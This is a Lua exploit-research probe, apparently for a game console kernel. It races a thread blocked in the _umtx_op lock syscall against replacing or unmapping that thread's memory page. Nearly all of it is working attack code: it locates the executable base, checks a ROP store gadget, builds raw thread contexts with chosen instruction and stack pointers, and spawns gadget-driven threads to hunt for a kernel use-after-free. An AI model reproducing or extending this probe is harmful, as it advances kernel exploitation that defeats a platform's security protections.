-- CRASH_CLASS: HIGH (mapping replaced under a kernel-blocked umtx waiter)
-- PROBE 273a: umtx waiter vs mapping replacement / munmap
--
-- Context: syscall 454 (_umtx_op) is real on 14.10 (op 5 wrote an owner TID,
-- op 21 returned 0 in 56i2). The 13.60 capture (docs/dumps_13.60) shows the
-- 27-op jump table; ops 0/1 are stubs (ret 0x2d), op 4 tails into a try-lock,
-- op 5 (rva 0x37fc90) is the full lock handler, op 6 tails into unlock, op 26
-- is stubbed (ret 0x4e), op 25 (SHM) is real.
--
-- Attack class: a thread blocked inside MUTEX_LOCK holds an entry in the
-- kernel umtx wait queue keyed to the mapping of its user address. Replacing
-- that mapping (mmap MAP_FIXED over it) or unmapping it while the waiter is
-- queued is the classic waiter-vs-vm race. If the kernel faults on the stale
-- key at wake time, that is a kernel bug; if it revalidates cleanly, the
-- negative result bounds the surface.
--
-- Child recipe (158a/158b/158c proven): RIP = syscall.syscall_address
-- (mov r10, rcx; syscall; ret), RAX = 454, RDI = umtx word, RSI = op,
-- stack = [store gadget][jmp $]. The store gadget writes the syscall retval
-- onto the umtx word itself, so "word == small retval" means the child
-- returned and "word == main TID" means it is still blocked.

print("=== PROBE 273a: umtx waiter vs mapping replacement ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function q(v)
    if type(v) == "table" and v.h then
        return string.format("0x%08X_%08X", v.h, v.l)
    end
    return string.format("0x%X", to_num(v))
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function wd(addr, val) return pcall(function() memory.write_dword(addr, val) end) end
local function wq(addr, val) return pcall(function() memory.write_qword(addr, val) end) end
local function rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function zero(addr, n)
    for off = 0, n - 1, 8 do wq(addr + off, uint64(0)) end
end

local sc_getpid = make_syscall(20)
local sc_thr_self = make_syscall(432)
local sc_thr_kill = make_syscall(431)
local sc_thr_create = make_syscall(430)
local sc_mmap = make_syscall(477)
local sc_munmap = make_syscall(73)
local sc_umtx = make_syscall(454)
local sc_nanosleep = make_syscall(240)

local ok0, pid0 = pcall(function() return sc_getpid():tonumber() end)
print("[0] canary pid=" .. tostring(pid0))

local tid_buf = memory.alloc(8)
zero(tid_buf, 8)
pcall(function() sc_thr_self(uint64(tid_buf)) end)
local main_tid = rq(tid_buf)
print("[0] main TID=" .. q(main_tid))

local info = memory.alloc(0x200)
zero(info, 0x200)
wd(info, 0x160)
pcall(function() make_syscall(593)(uint64(0), info) end)
local text_lo = rd(info + 0x108)
local text_hi = rd(info + 0x10C)
if not text_lo then
    print("[0] module query returned nothing; aborting")
    return
end
local eboot_base = uint64(string.format("0x%X%08X", text_hi or 0, text_lo or 0))
print("[0] eboot text base=" .. q(eboot_base))

local SW = syscall.syscall_address
if SW == nil then
    print("[0] syscall.syscall_address is nil; aborting")
    return
end

local function check4(addr, b1, b2, b3, b4)
    local ok = true
    local vals = {}
    for i = 0, 3 do
        local o, v = pcall(function() return memory.read_byte(addr + i) end)
        vals[i + 1] = o and to_num(v) or -1
    end
    return vals[1] == b1 and vals[2] == b2 and vals[3] == b3 and vals[4] == b4
end

local store = eboot_base + 0x92C67
local jmp_self = eboot_base + 0x15481
if not check4(store, 0x48, 0x89, 0x07, 0xC3) then
    print("[1] store gadget mismatch at " .. q(store) .. "; aborting")
    return
end
print("[1] store=" .. q(store) .. " jmp $=" .. q(jmp_self))

local C_RDI, C_RSI, C_RAX = 0x048, 0x050, 0x078
local C_MAGIC, C_FLAGS, C_TYPE, C_CS, C_RIP, C_RSP, C_SS = 0x108, 0x0D0, 0x110, 0x0C0, 0x0E0, 0x0F8, 0x100

local function new_page()
    local p = sc_mmap(uint64(0), uint64(0x4000), uint64(3),
        uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
    zero(p, 0x38)
    return p
end

local function new_stack(words)
    local st = sc_mmap(uint64(0), uint64(0x4000), uint64(3),
        uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
    for k = 0, #words - 1 do
        wq(st + k * 8, words[k + 1])
    end
    return st
end

local function spawn(rip, rax, rdi, rsi, rsp)
    local ctx = sc_mmap(uint64(0), uint64(0x1000), uint64(3),
        uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
    zero(ctx, 0x500)
    wq(ctx + C_MAGIC, uint64(0x480))
    wd(ctx + C_FLAGS, 0)
    wd(ctx + C_TYPE, 0x10000)
    wd(ctx + C_CS, 0x43)
    wq(ctx + C_RIP, rip)
    wq(ctx + C_RSP, rsp)
    wd(ctx + C_SS, 0x3B)
    wq(ctx + C_RAX, rax)
    wq(ctx + C_RDI, rdi)
    wq(ctx + C_RSI, rsi)
    local id_buf = memory.alloc(8)
    zero(id_buf, 8)
    local ok, rv = pcall(function() return sc_thr_create(uint64(ctx), uint64(id_buf)) end)
    return rq(id_buf), ok, rv
end

local function sleep_ms(ms)
    local ts = memory.alloc(16)
    wq(ts, 0)
    wq(ts + 8, ms * 1000000)
    pcall(function() sc_nanosleep(uint64(ts), uint64(0)) end)
end

print("")
print("[2] main-thread op5/op6 sanity on a fresh page")
local P = new_page()
local lo = P
local r5 = sc_umtx(uint64(lo), uint64(5), uint64(0), uint64(0), uint64(0))
print("    lock: ret=" .. tostring(to_num(r5)) .. " owner=" .. q(rq(lo)))
local r6 = sc_umtx(uint64(lo), uint64(6), uint64(0), uint64(0), uint64(0))
print("    unlock: ret=" .. tostring(to_num(r6)) .. " owner=" .. q(rq(lo)))

print("")
print("[3] child op5 on the page the main thread locked")
-- main locks P again
sc_umtx(uint64(lo), uint64(5), uint64(0), uint64(0), uint64(0))
print("    pre-lock owner=" .. q(rq(lo)))
local tid1, ok1, rv1 = spawn(SW, uint64(454), uint64(lo), uint64(5), new_stack({ store, jmp_self }))
print("    child1 thr_create: ok=" .. tostring(ok1) .. " rv=" .. tostring(to_num(rv1)) .. " tid=" .. q(tid1))
sleep_ms(1000)
local w1 = rq(lo)
local kill1 = sc_thr_kill(uint64(tid1), uint64(0))
print("    after 1s: word=" .. q(w1) .. " thr_kill(tid1,0)=" .. tostring(to_num(kill1)))
local blocked = false
if w1 ~= nil and q(w1) == q(main_tid) then
    blocked = true
    print("    child1 is BLOCKED inside op5 (word still main TID)")
elseif w1 ~= nil then
    print("    child1 returned; word = syscall retval or child-written owner")
end

if blocked then
    print("")
    print("[4] replace the waiter mapping: mmap MAP_FIXED over the umtx page")
    -- compute page-aligned base via arithmetic on the low dword
    local _, lo_lo = get_hi_lo(lo)
    local aligned_lo = lo_lo - (lo_lo % 0x4000)
    local lo_hi = select(1, get_hi_lo(lo))
    local pbase = uint64(string.format("0x%X%08X", lo_hi, aligned_lo))
    local rv_fixed = sc_mmap(pbase, uint64(0x4000), uint64(3), uint64(0x1012), uint64(0xFFFFFFFF), uint64(0))
    print("    mmap MAP_FIXED ret=" .. tostring(to_num(rv_fixed)) .. " base=" .. q(pbase))
    sleep_ms(500)
    local w2 = rq(lo)
    print("    word after replace: " .. (w2 == nil and "UNREADABLE (fault)" or q(w2)))
    local kill1b = sc_thr_kill(uint64(tid1), uint64(0))
    print("    thr_kill(tid1,0) after replace=" .. tostring(to_num(kill1b)))
    -- try to release the waiter through op6 on the same address
    local r6b = sc_umtx(uint64(lo), uint64(6), uint64(0), uint64(0), uint64(0))
    print("    op6 unlock after replace ret=" .. tostring(to_num(r6b)))
    sleep_ms(500)
    local w3 = rq(lo)
    print("    word after unlock attempt: " .. (w3 == nil and "UNREADABLE" or q(w3)))
    local kill1c = sc_thr_kill(uint64(tid1), uint64(0))
    print("    thr_kill(tid1,0) final=" .. tostring(to_num(kill1c)))
else
    print("")
    print("[4] skipped: no blocked waiter was produced")
end

print("")
print("[5] munmap control on an unwaited page")
local P2 = new_page()
local _, p2_lo = get_hi_lo(P2)
local p2_aligned = p2_lo - (p2_lo % 0x4000)
local p2_hi = select(1, get_hi_lo(P2))
local p2base = uint64(string.format("0x%X%08X", p2_hi, p2_aligned))
local rmu = sc_munmap(p2base, uint64(0x4000))
print("    munmap ret=" .. tostring(to_num(rmu)) .. " then read: " .. tostring(rq(P2) ~= nil))

pcall(function() sc_thr_kill(uint64(tid1), uint64(9)) end)
local ok9, pid9 = pcall(function() return sc_getpid():tonumber() end)
print("")
print("[6] canary after: ok=" .. tostring(ok9) .. " pid=" .. tostring(pid9))
print("=== PROBE 273a DONE ===")
